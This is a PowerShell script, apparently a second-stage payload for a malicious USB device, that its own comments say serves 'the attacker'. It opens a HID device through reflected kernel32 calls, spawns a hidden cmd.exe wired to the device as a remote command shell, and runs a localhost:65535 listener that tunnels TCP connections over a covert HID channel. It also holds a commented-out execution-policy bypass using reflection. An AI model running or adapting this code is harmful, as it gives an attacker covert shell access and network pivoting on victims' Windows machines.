## This script acts as a multiplexing proxy, forwarding data between incoming
## TCP connections on localhost:65535, and the attackers proxy on the other
## side of the USB device.
##
## It also starts a cmd.exe instance, and connects it to channel 1, to allow the
## attacker to execute other programs to actually make connections to port 65535

## this function is useful for testing purposes, to allow execution within
## powershell_ise, even if the execution policy prohibits execution of scripts
# function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy

## It is rather difficult to debug this script when it is run via "IEx", as any
## resulting error messages are rather obscure, and exclude helpful things like
## line numbers, etc. In order to debug this script, then, it can be run
## directly within ISE, or from the command line. It detects this case by the
## existence of the $M or $f variables, which should otherwise be defined by the
## stage0 loader. If they are not defined, open the device ourselves!

$M = 64
if ($devfile -eq $null) {
  $USB_VID="1D6B"; $USB_PID="1347"
  function ReflectCreateFileMethod()
  {
    $dom = [AppDomain]::CurrentDomain
    $da = New-Object Reflection.AssemblyName("MaMe82DynAssembly")
    $ab = $dom.DefineDynamicAssembly($da, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $mb = $ab.DefineDynamicModule("MaMe82DynModule", $False)
    $tb = $mb.DefineType("MaMe82", "Public, Class")
    $cfm = $tb.DefineMethod("CreateFile", [Reflection.MethodAttributes] "Public, Static", [IntPtr], [Type[]] @([String], [Int32], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr] ))
    $cdi = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $cfa = [Reflection.FieldInfo[]] @([Runtime.InteropServices.DllImportAttribute].GetField("EntryPoint"), [Runtime.InteropServices.DllImportAttribute].GetField("PreserveSig"), [Runtime.InteropServices.DllImportAttribute].GetField("SetLastError"), [Runtime.InteropServices.DllImportAttribute].GetField("CallingConvention"), [Runtime.InteropServices.DllImportAttribute].GetField("CharSet"))
    $cffva = [Object[]] @("CreateFile", $True, $True, [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $cfca = New-Object Reflection.Emit.CustomAttributeBuilder($cdi, @("kernel32.dll"), $cfa, $cffva)
    $cfm.SetCustomAttribute($cfca)
    $tb.CreateType()
  }

  function CreateFileStreamFromDevicePath($mmcl, [String] $path)
  {
    $h = $mmcl::CreateFile($path, [Int32]0XC0000000, [IO.FileAccess]::ReadWrite, [IntPtr]::Zero, [IO.FileMode]::Open, [UInt32]0x40000000, [IntPtr]::Zero)
    $a = $h, [Boolean]0
    $c=[Microsoft.Win32.SafeHandles.SafeFileHandle].GetConstructors()[0]
    $h = $c.Invoke($a)
    $fa=[IO.FileAccess]::ReadWrite
    $a=$h, $fa, [Int32]64, [Boolean]1
    $c=[IO.FileStream].GetConstructors()[14]
    return $c.Invoke($a)
  }

  function GetDevicePath($USB_VID, $USB_PID)
  {
    $HIDGuid="{4d1e55b2-f16f-11cf-88cb-001111000030}"
    foreach ($wmidev in gwmi Win32_USBControllerDevice |%{[wmi]($_.Dependent)} ) {
      if ($wmidev.DeviceID -match ("$USB_VID" + '&PID_' + "$USB_PID") -and $wmidev.DeviceID -match ('HID') -and -not $wmidev.Service) {
        $devpath = "\\?\" + $wmidev.PNPDeviceID.Replace('\','#') + "#" + $HIDGuid
      }
    }
    $devpath
  }

  $mmcl = ReflectCreateFileMethod
  $path= GetDevicePath $USB_VID $USB_PID

  $devfile = CreateFileStreamFromDevicePath $mmcl $path
}

$Proxy = {
	Param($M, $Device)

	$SYN=1
	$ACK=2
	$FIN=4
	$RST=8

	$ackQueue = New-Object -TypeName System.Collections.Queue
	$ackQueue.Enqueue(0) # to get the ball rolling
	$txQueue = New-Object -TypeName System.Collections.Queue
	$script:txSeq = 12
    $lastRxSeq = 0xFF
    $lastRxAck = $txSeq - 1
    $rxSeq = 0
    $rxAck = 0

	# Spawn the command with provided arguments, and return the Process
	function spawn($filename, $arguments) {
		$p = New-Object -TypeName System.Diagnostics.Process
		$i = $p.StartInfo
		$i.CreateNoWindow = $true
		$i.UseShellExecute = $false
		$i.RedirectStandardInput = $true
		$i.RedirectStandardOutput = $true
		$i.RedirectStandardError = $true
		$i.FileName = $filename
		$i.Arguments = $arguments
		$null = $p.Start()
		return $p
	}

	function bs($v, $n) { [math]::floor($v * [math]::pow(2, $n)) }
	function sa($s,$a) { (bs ($s -band 15) 4) -bor ($a -band 15)}
	function seq($b) { (bs $b -4) -band 15 }
	function ack($b) { $b -band 15 }

	## The TCB contains the necessary per-channel variables
	function MakeTCB($channel, $ReadStream, $WriteStream) {
		return @{
			Channel = $channel
			ReadStream = $ReadStream
			WriteStream = $WriteStream
			## Making the Stream Read Buffer larger than a single packet can
			## improve throughput. However, it results in multiple packets
			## being sent without waiting for acknowledgement, which has caused
			## lost packets during testing (I think this was the cause, anyway!)
			StreamReadBuff = New-Object Byte[] (($M-4)*1)
		}
	}

	function MakeEmptyHIDPacket() {
		return New-Object Byte[] ($M+1)
	}

	## Constructs a packet ready for sending over the USB HID interface
	function MakeHIDPacket($tcb, $flag, $data, $length) {
		# Basic sanity checks
		if ($length -lt 0 -or $length -gt ($M-4)) {
			$length = 0
			[System.Console]::WriteLine("Length out of range: " + $length)
			exit
		}
		$b = @(0, 0, $tcb.Channel, $flag, $length) + $data[0..$length] + (@(0)*($M-4-$length))

		# more sanity checks
		if ($b.Length -ne ($M+1)) {
			[System.Console]::WriteLine("Invalid length: " + $b.Length)
			[System.Console]::WriteLine("Packet: " + $b)
		}
		return $b
	}

	## Try to avoid printing output on the fast path, console output DESTROYS
	## performance!
	function debugPacket($prefix, $packet) {
		# if ($packet[3] -ne 0 -or $packet[4] -ne 0) {
			# [Console]::WriteLine($prefix + [System.BitConverter]::ToString($packet))
		# }
	}

	function WriteDevice($packet) {
		$ack = $script:lastRxSeq
		if ($ackQueue.Count -gt 0) {
			$ack = $ackQueue.DeQueue()
			$script:lastRxAck = $ack
		}
		$packet[1+0] = sa $script:txSeq $ack
		$script:txSeq = ($script:txSeq + 1) -band 0x0F
		debugPacket "TX: " $packet
		$device.Write($packet, 0, ($M+1))
	}

	function TryWriteQueue() {
		if ($ackqueue.Count -gt 0) {
			if ($txQueue.Count -gt 0) {
				WriteDevice($txQueue.DeQueue())
			} else {
				WriteDevice(MakeEmptyHIDPacket)
			}
		}
	}

	## Read from a Socket or Process InputStream if the Async Read is complete
	## returns $true if the Async Read was complete, $false otherwise
	function ReadSocket($tcb) {
		if ($tcb.StreamReadTask -ne $null -and $tcb.StreamReadTask.IsCompleted) {
			try {
				$r = $tcb.ReadStream.EndRead($tcb.StreamReadTask)
				if ($r -gt 0) { ## If we have data, write it to the HID interface
					$s=0
					while ($r - $s -gt 0) {
						## Funky PS ternary operator idiom follows!
						$l = (($r - $s), ($M-4))[($r-$s) -gt ($M-4)]
						$txQueue.Enqueue((MakeHIDPacket $tcb $ACK $tcb.StreamReadBuff[$s..($s+$l-1)] $l))
						$s += $l
					}
					$tcb.StreamReadTask = $tcb.ReadStream.BeginRead($tcb.StreamReadBuff, 0, $tcb.StreamReadBuff.Length, $null, $null)
				} else {        ## The connection is now closed
					$txQueue.Enqueue((MakeHIDPacket $tcb $FIN @() 0))
					CleanupTCB $tcb
				}
			} catch {
				[System.Console]::WriteLine("Caught exception reading channel " + $tcb.Channel)
				$txQueue.Enqueue((MakeHIDPacket $tcb $FIN @() 0))
				CleanupTCB $tcb
			}
			return $true
		}
		return $false
	}

	function OpenChannel($channel, $ReadStream, $WriteStream) {
		$tcb = MakeTCB $channel $ReadStream $WriteStream
		[System.Console]::WriteLine("Using TCB channel " + $tcb.Channel)
		$txQueue.Enqueue((MakeHIDPacket $tcb $SYN @() 0))
		return $tcb
	}

	function CleanupTCB($tcb) {
		[System.Console]::WriteLine("Cleanup channel " + $tcb.Channel)

		if ($tcb.ReadStream -ne $null) {
			try {
				$tcb.ReadStream.Close()
				$tcb.ReadStream.Dispose()
				$tcb.StreamReadTask = $null
				$tcb.ReadStream = $null

				$tcb.WriteStream.Close()
				$tcb.WriteStream.Dispose()
				$tcb.WriteStream = $null
			} catch {
				echo $_.Exception|format-list -force
			}
		}
	}

	try {
		$conns=New-Object HashTable[] 256

		## define two device read buffers, and alternate between them when reading
		## from the HID. This serves two purposes:
		## 1. It allows us to begin the read immediately the previous one finishes
		##    This is important for performance reasons
		## 2. It stops the subsequent read from overwriting data in the buffer before
		##    we are done processing it!
		## 3. It also seems to perform better than just allocating a new buffer each
		##    time
		$db = $true
		$DeviceBuff = New-Object Byte[][] 2
		$DeviceBuff[$db] = New-Object Byte[] ($M+1)
		$DeviceBuff[!$db] = New-Object Byte[] ($M+1)
		$DeviceReadTask = $device.BeginRead($DeviceBuff[$db], 0, ($M+1), $null, $null)

		# Purge any unread data from the stream
		$sw = [Diagnostics.Stopwatch]::StartNew()
		while ($sw.Elapsed.TotalSeconds -lt 2) {
			if ($DeviceReadTask.IsCompleted) {
				$l = $device.EndRead($DeviceReadTask)
				$DeviceReadTask = $device.BeginRead($DeviceBuff[$db], 0, ($M+1), $null, $null)
			} else {
				Start-Sleep -m 10
			}
		}

		# Spawn a command prompt on channel 1
		$cmd = spawn "cmd.exe" "/c cmd.exe /k 2>&1 "
		$conns[1] = OpenChannel 1 $cmd.StandardOutput.BaseStream $cmd.StandardInput.BaseStream

		$TcpListener = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Loopback, 65535)
		$TcpListener.Start()
		$ListenerTask = $TcpListener.BeginAcceptTcpClient($null, $null)

		[System.Console]::WriteLine("Entering proxy loop")
		while ($true) {
			$loop++
			if ($DeviceReadTask.IsCompleted) {
				$loop = 0
				$l = $device.EndRead($DeviceReadTask)
				$db = !$db ## Switch buffers
				$DeviceReadTask = $device.BeginRead($DeviceBuff[$db], 0, ($M+1), $null, $null)
				debugPacket "RX: " $DeviceBuff[!$db]
				if ($l -ne ($M+1)) {
					[System.Console]::WriteLine("Error reading from device, got " + $l + " bytes")
					$TcpListener.Stop()
					exit
				}

				$rxSeq = seq $DeviceBuff[!$db][1+0]
				$rxAck = ack $DeviceBuff[!$db][1+0]

				if (($lastRxSeq -eq 0xFF) -or ($rxSeq -eq (($lastRxSeq+1) -band 0x0F))) {
					$lastRxSeq = $rxSeq
				} else {
					[Console]::WriteLine("Bad RX Seq, expected " + (($lastRxSeq+1) -band 0x0F) +", got " + $rxSeq)
				}
				if (($rxAck -eq $lastRxAck) -or ($rxAck -eq (($lastRxAck+1) -band 0x0F))) {
					$lastRxAck = $rxAck
				} else {
					[Console]::WriteLine("Bad RX Ack, expected " + (($lastRxAck+1) -band 0x0F) +", got " + $rxAck)
				}

				$ackQueue.Enqueue($rxSeq)
				$channel = $DeviceBuff[!$db][1+1]
				$tcb = $conns[$channel]
				$flag = $DeviceBuff[!$db][1+2]
				$length = $DeviceBuff[!$db][1+3]
				if ($flag -eq $SYN) {
					# incoming from the other side of the HID, not supported yet
					$tcb = MakeTCB $channel $null $null
					$txQueue.Enqueue((MakeHIDPacket $tcb $RST @() 0))
					CleanupTCB $tcb
				} elseif ($tcb -ne $null -band ($flag -eq $FIN -or $flag -eq $RST )) {
					$txQueue.Enqueue((MakeHIDPacket $tcb ($flag -bor $ACK) @() 0))
					CleanupTCB $tcb
				} elseif (($flag -band $ACK) -eq $ACK -and $tcb -ne $null) {
					# If we get a SYN/ACK, we can start reading from the socket
					if (($flag -band $SYN) -eq $SYN) {
						[Console]::WriteLine("Starting read from channel " + $tcb.Channel)
						$tcb.StreamReadTask = $tcb.ReadStream.BeginRead($tcb.StreamReadBuff, 0, $tcb.StreamReadBuff.Length, $null, $null)
						$txQueue.Enqueue((MakeHIDPacket $tcb $ACK @() 0))
					} elseif (($flag -band $FIN) -eq $FIN) { ## Connection closed
						$txQueue.Enqueue((MakeHIDPacket $tcb ($FIN -bor $ACK) @() 0))
						$conns[$channel] = $null
						CleanupTCB $tcb
					} elseif ($length -eq 0) {
						# Empty Ack packet
						$txQueue.Enqueue((MakeHIDPacket $tcb $ACK @() 0))
					} elseif ($length -gt 0) {
						try {
							$data = $DeviceBuff[!$db][5..(5+$length-1)]
							$tcb.WriteStream.Write($DeviceBuff[!$db], 1+4, $length)
							$tcb.WriteStream.Flush()
							$txQueue.Enqueue((MakeHIDPacket $tcb $ACK @() 0))
						} catch {
							$txQueue.Enqueue((MakeHIDPacket $tcb $RST @() 0))
							CleanupTCB $tcb
							continue
						}
					} else {
#							[System.Console]::WriteLine("Unhandled packet!")
#							[System.Console]::WriteLine(([Text.Encoding]::ASCII).GetString($DeviceBuff[!$db], 1+4, $DeviceBuff[!$db][1+3]))
					}
				}
			} # else
			if ($ListenerTask.IsCompleted) {
				$loop = 0
				[System.Console]::WriteLine("Connection received")
				$channel = $null
				for ($c=2; $c -lt 255; $c++) {
					if ($conns[$c] -eq $null) {
						$channel = $c
						break
					}
				}
				[System.Console]::WriteLine("Connect will use channel: " + $channel)
				$client = $TcpListener.EndAcceptTcpClient($ListenerTask)
				if ($channel -eq $null) {
					[System.Console]::WriteLine("No channels available")
					$client.Close()
				} else {
					$tcb = OpenChannel $channel $client.GetStream() $client.GetStream()
					$conns[$channel] = $tcb
				}
				$ListenerTask = $TcpListener.BeginAcceptTcpClient($null, $null)
			} # else
			if ($true) {
				for ($c=1;$c -lt 256;$c++) {
					if ($conns[$c] -ne $null -and (ReadSocket $conns[$c])) {
						$loop = 0
					}
				}
			}
			TryWriteQueue
			## I wish I knew a way to wait on completion of the Async operations in
			## powershell. This spinning uses too much CPU, but we can't sleep too
			## much! :-(
			if ($loop -eq 10) {
				$loop=0
				Start-Sleep -m 50
			}
		}
	} catch {
		echo $_.Exception|format-list -force
	}

	[System.Console]::Write("Proxy thread completed")
	$cmd.Kill()
	$device.Close()
	if ($socket -ne $null) {
		$socket.Close()
	}
	exit
}

& $Proxy $M $devfile
